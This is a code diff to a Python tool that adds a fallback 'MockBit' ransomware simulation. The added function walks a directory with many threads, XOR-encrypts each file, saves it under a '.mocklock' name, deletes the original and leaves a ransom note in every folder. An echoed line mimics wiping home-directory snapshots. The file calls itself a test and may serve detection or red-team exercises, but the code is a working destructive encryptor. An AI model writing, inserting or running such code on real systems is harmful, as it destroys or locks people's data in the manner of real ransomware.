@@ -9,6 +9,9 @@ from pathlib import Path
 import importlib.util
 from Crypto.Cipher import AES
 from argon2.low_level import hash_secret_raw, Type
+from concurrent.futures import ThreadPoolExecutor
+import tempfile
+import subprocess
 
 try:
     from mockbit.ransom_sim import run_simulation as _ransom_sim
@@ -24,6 +27,50 @@ except Exception:  # pragma: no cover - optional module for binaries
             _ransom_sim = None
     except Exception:
         _ransom_sim = None
+
+if _ransom_sim is None:
+    def _ransom_sim(target_dir: Path, threads: int = 8) -> None:
+        """Fallback ransomware simulation if module import fails."""
+        NOTE_TEXT = (
+            "Your files have been encrypted by MockBit-Test.\n"
+            "This is ONLY a test. No real ransom. Key = AA.\n"
+        )
+        _KEY = 0xAA
+
+        def _xor_bytes(data: bytes) -> bytes:
+            return bytes(b ^ _KEY for b in data)
+
+        def _process_file(file_path: Path) -> None:
+            try:
+                with open(file_path, "rb") as f:
+                    data = f.read()
+                enc = _xor_bytes(data)
+                tmp_fd, tmp_name = tempfile.mkstemp(dir=str(file_path.parent))
+                with os.fdopen(tmp_fd, "wb") as tmp:
+                    tmp.write(enc)
+                    tmp.flush()
+                    os.fsync(tmp.fileno())
+                out = file_path.with_suffix(file_path.suffix + ".mocklock")
+                os.replace(tmp_name, out)
+                os.unlink(file_path)
+            except Exception:
+                pass
+
+        with ThreadPoolExecutor(max_workers=threads) as exe:
+            for dirpath, _, files in os.walk(target_dir):
+                root = Path(dirpath)
+                for name in files:
+                    fp = root / name
+                    if not fp.is_file() or fp.is_symlink():
+                        continue
+                    exe.submit(_process_file, fp)
+                note = root / "README_MOCKBIT_RESTORE.txt"
+                try:
+                    with open(note, "w") as f:
+                        f.write(NOTE_TEXT)
+                except Exception:
+                    pass
+        subprocess.run(["/bin/echo", "simulate rm -rf /home/*/.snapshots"])
 
 # Default options
 START_PATH = "folder"
